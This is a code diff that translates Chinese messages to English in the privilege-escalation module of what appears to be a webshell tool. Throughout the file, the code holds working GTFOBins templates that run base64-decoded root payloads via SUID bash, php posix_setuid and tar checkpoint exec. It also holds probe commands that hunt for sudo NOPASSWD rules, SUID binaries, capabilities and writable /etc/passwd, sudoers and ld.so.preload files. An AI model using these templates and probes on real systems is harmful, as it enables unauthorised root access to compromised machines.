@@ -156,7 +156,7 @@ const List<GtfoBin> gtfoBins = [
         r'''{prefix}{bin} -p -c "echo {b64_root} | base64 -d | sh -p"''',
     proofTemplate: r'''{prefix}{bin} -p -c id''',
     proofMarkers: ['uid=0(root)', 'euid=0(root)'],
-    quirk: 'SUID bash 必须带 -p，否则会丢弃 euid。',
+    quirk: 'SUID bash must be run with -p, otherwise euid is dropped.',
   ),
   GtfoBin(
     id: 'find',
@@ -192,7 +192,7 @@ const List<GtfoBin> gtfoBins = [
     proofTemplate: r'''{prefix}{bin} -e 'exec "/usr/bin/id"' ''',
     proofMarkers: ['uid=0(root)', 'euid=0(root)'],
     suidSafe: false,
-    quirk: '现代 perl 以 SUID 运行会自动丢弃 euid，仅 sudo 免密路径可用。',
+    quirk: 'Modern perl drops euid automatically when run SUID; only the sudo NOPASSWD path works.',
   ),
   GtfoBin(
     id: 'ruby',
@@ -210,7 +210,7 @@ const List<GtfoBin> gtfoBins = [
         r'''{prefix}{bin} -r 'posix_setuid(0); system("echo {b64_root}|base64 -d|sh -p");' ''',
     proofTemplate: r'''{prefix}{bin} -r 'posix_setuid(0); system("/usr/bin/id");' ''',
     proofMarkers: ['uid=0(root)', 'euid=0(root)'],
-    quirk: '需要 posix 扩展（posix_setuid）。',
+    quirk: 'Requires the posix extension (posix_setuid).',
   ),
   GtfoBin(
     id: 'env',
@@ -228,7 +228,7 @@ const List<GtfoBin> gtfoBins = [
     proofTemplate: r'''{prefix}{bin} 'BEGIN {system("/usr/bin/id")}' ''',
     proofMarkers: ['uid=0(root)', 'euid=0(root)'],
     suidSafe: false,
-    quirk: 'system() 经由非 -p 的 sh 执行，SUID 下丢权，仅 sudo 免密路径可用。',
+    quirk: 'system() runs through a non--p sh, dropping privileges under SUID; only the sudo NOPASSWD path works.',
   ),
   GtfoBin(
     id: 'tar',
@@ -239,7 +239,7 @@ const List<GtfoBin> gtfoBins = [
         r'''{prefix}{bin} -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/usr/bin/id''',
     proofMarkers: ['uid=0(root)', 'euid=0(root)'],
     suidSafe: false,
-    quirk: '需要 GNU tar；checkpoint exec 经由 sh 执行，SUID 下丢权，仅 sudo 免密路径可用。',
+    quirk: 'Requires GNU tar; checkpoint exec runs via sh, dropping privileges under SUID; only the sudo NOPASSWD path works.',
   ),
   GtfoBin(
     id: 'busybox',
@@ -249,7 +249,7 @@ const List<GtfoBin> gtfoBins = [
     proofTemplate: r'''{prefix}{bin} id''',
     proofMarkers: ['uid=0(root)', 'euid=0(root)'],
     suidSafe: false,
-    quirk: 'busybox 的 SUID applet 行为依赖编译配置，常丢权，仅 sudo 免密路径可靠。',
+    quirk: "busybox's SUID applet behavior depends on compile config and often drops privileges; only the sudo NOPASSWD path is reliable.",
   ),
 ];
 
@@ -279,7 +279,7 @@ List<PrivEscCandidate> detectSudo(String output) {
         binPath: '/bin/sh',
         prefix: 'sudo -n ',
         gtfo: _matchBin('sh'),
-        evidence: 'sudo 可免密执行任意命令（NOPASSWD: ALL）。',
+        evidence: 'sudo can run any command without a password (NOPASSWD: ALL).',
       ),
     );
     return candidates; // ALL already covers every specific binary.
@@ -295,7 +295,7 @@ List<PrivEscCandidate> detectSudo(String output) {
           binPath: path,
           prefix: 'sudo -n ',
           gtfo: gtfo,
-          evidence: 'sudo 可免密执行 $path（GTFOBins: ${gtfo.name}）。',
+          evidence: 'sudo can run $path without a password (GTFOBins: ${gtfo.name}).',
         ),
       );
     }
@@ -317,7 +317,7 @@ List<PrivEscCandidate> detectSuid(String output) {
           vectorId: 'suid',
           binPath: path,
           gtfo: gtfo,
-          evidence: '发现 SUID 二进制 $path（GTFOBins: ${gtfo.name}）。',
+          evidence: 'SUID binary found: $path (GTFOBins: ${gtfo.name}).',
         ),
       );
     } else if (gtfo != null) {
@@ -327,7 +327,7 @@ List<PrivEscCandidate> detectSuid(String output) {
           vectorId: 'suid-sudo-only',
           binPath: path,
           evidence:
-              '发现 SUID 二进制 $path（GTFOBins: ${gtfo.name}），但 ${gtfo.name} 以 SUID 运行会自动丢弃权限，无法经 SUID 提权；仅当可 `sudo -n` 免密执行时可用（见 sudo 向量）。',
+              'SUID binary found: $path (GTFOBins: ${gtfo.name}), but ${gtfo.name} drops privileges automatically when run SUID, so it cannot escalate via SUID; it is only usable when `sudo -n` runs it passwordless (see the sudo vector).',
         ),
       );
     } else if (interactiveSuidBins.containsKey(base)) {
@@ -336,7 +336,7 @@ List<PrivEscCandidate> detectSuid(String output) {
           vectorId: 'suid-interactive',
           binPath: path,
           evidence:
-              '发现 SUID 二进制 $path，但需交互 TTY（${interactiveSuidBins[base]}），本通道不可直接执行。',
+              'SUID binary found: $path, but it needs an interactive TTY (${interactiveSuidBins[base]}); this channel cannot run it directly.',
         ),
       );
     }
@@ -350,7 +350,7 @@ List<PrivEscCandidate> detectWritablePasswd(String output) {
   return const [
     PrivEscCandidate(
       vectorId: 'writable-passwd',
-      evidence: '/etc/passwd 可写，可直接追加 UID-0 用户。',
+      evidence: '/etc/passwd is writable; a UID-0 user can be appended directly.',
     ),
   ];
 }
@@ -361,7 +361,7 @@ List<PrivEscCandidate> detectWritableSudoers(String output) {
   return const [
     PrivEscCandidate(
       vectorId: 'writable-sudoers',
-      evidence: '/etc/sudoers.d 可写，可直接写入 NOPASSWD 规则。',
+      evidence: '/etc/sudoers.d is writable; a NOPASSWD rule can be written directly.',
     ),
   ];
 }
@@ -374,14 +374,14 @@ List<PrivEscCandidate> detectCapabilities(String output) {
       candidates.add(
         PrivEscCandidate(
           vectorId: 'capabilities',
-          evidence: '发现 cap_setuid 二进制：${line.trim()}（可 setuid(0) 提权，需按解释器确认）。',
+          evidence: 'cap_setuid binary found: ${line.trim()} (can setuid(0) to escalate; confirm per interpreter).',
         ),
       );
     } else if (line.contains('cap_dac_read_search')) {
       candidates.add(
         PrivEscCandidate(
           vectorId: 'capabilities',
-          evidence: '发现 cap_dac_read_search 二进制：${line.trim()}（仅可读敏感文件，非 root）。',
+          evidence: 'cap_dac_read_search binary found: ${line.trim()} (can only read sensitive files, not root).',
         ),
       );
     }
@@ -399,7 +399,7 @@ List<PrivEscCandidate> detectLdPreload(String output) {
       PrivEscCandidate(
         vectorId: 'ld-preload',
         evidence:
-            '/etc/ld.so.preload 可写：可注入恶意共享库，让所有新进程（含 root 进程）加载。但写入错误会导致所有进程启动失败（含 webshell 自身），风险极高，仅作线索、绝不自动利用。',
+            '/etc/ld.so.preload is writable: a malicious shared library can be injected and loaded by every new process (including root). But a bad entry breaks all process startup (including the webshell itself) — extremely risky; a lead only, never auto-exploited.',
       ),
     ];
   }
@@ -407,7 +407,7 @@ List<PrivEscCandidate> detectLdPreload(String output) {
     return const [
       PrivEscCandidate(
         vectorId: 'ld-preload',
-        evidence: '/etc/ld.so.preload 已存在，检查其内容判断是否已被植入。',
+        evidence: '/etc/ld.so.preload already exists; inspect its contents to see whether it has been tampered with.',
       ),
     ];
   }
@@ -419,16 +419,16 @@ List<PrivEscCandidate> detectLdPreload(String output) {
 final List<PrivEscVector> vectors = [
   PrivEscVector(
     id: 'sudo',
-    title: 'Sudo 免密提权',
-    description: 'sudo -n -l 检测免密规则。',
+    title: 'Sudo NOPASSWD Escalation',
+    description: 'Scans sudo -n -l for NOPASSWD rules.',
     tier: PrivEscTier.tier1,
     probeCommand: r'''timeout 25 sudo -n -l 2>&1 | head -50''',
     detect: detectSudo,
   ),
   PrivEscVector(
     id: 'suid',
-    title: 'SUID 提权',
-    description: '枚举 SUID 二进制并匹配 GTFOBins 白名单。',
+    title: 'SUID Escalation',
+    description: 'Enumerates SUID binaries and matches them against the GTFOBins allowlist.',
     tier: PrivEscTier.tier1,
     probeCommand:
         r'''timeout 25 find /bin /usr/bin /usr/sbin /sbin /usr/local/bin /opt /tmp /snap -maxdepth 3 -perm -4000 -type f 2>/dev/null | head -60''',
@@ -436,8 +436,8 @@ final List<PrivEscVector> vectors = [
   ),
   PrivEscVector(
     id: 'writable-passwd',
-    title: '可写 /etc/passwd',
-    description: '检测 /etc/passwd 是否可写。',
+    title: 'Writable /etc/passwd',
+    description: 'Scans whether /etc/passwd is writable.',
     tier: PrivEscTier.tier1,
     probeCommand:
         r'''[ -w /etc/passwd ] && echo writable || echo not writable''',
@@ -446,8 +446,8 @@ final List<PrivEscVector> vectors = [
   ),
   PrivEscVector(
     id: 'writable-sudoers',
-    title: '可写 /etc/sudoers.d',
-    description: '检测 /etc/sudoers.d 是否可写。',
+    title: 'Writable /etc/sudoers.d',
+    description: 'Scans whether /etc/sudoers.d is writable.',
     tier: PrivEscTier.tier1,
     probeCommand:
         r'''{ [ -d /etc/sudoers.d ] && [ -w /etc/sudoers.d ] && echo writable || echo not writable; }''',
@@ -456,16 +456,16 @@ final List<PrivEscVector> vectors = [
   ),
   PrivEscVector(
     id: 'capabilities',
-    title: 'Capabilities 线索',
-    description: '检测 cap_setuid / cap_dac_read_search 等高危能力。',
+    title: 'Capabilities Lead',
+    description: 'Scans for high-risk capabilities like cap_setuid / cap_dac_read_search.',
     tier: PrivEscTier.tier3,
     probeCommand: r'''timeout 25 getcap -r / 2>/dev/null | head -40''',
     detect: detectCapabilities,
   ),
   PrivEscVector(
     id: 'ld-preload',
-    title: '/etc/ld.so.preload 可写',
-    description: '检测 /etc/ld.so.preload 是否可写（仅线索，绝不自动利用）。',
+    title: 'Writable /etc/ld.so.preload',
+    description: 'Scans whether /etc/ld.so.preload is writable (lead only, never auto-exploited).',
     tier: PrivEscTier.tier3,
     probeCommand:
         r'''[ -w /etc/ld.so.preload ] && echo writable || ([ -e /etc/ld.so.preload ] && echo exists || echo absent)''',
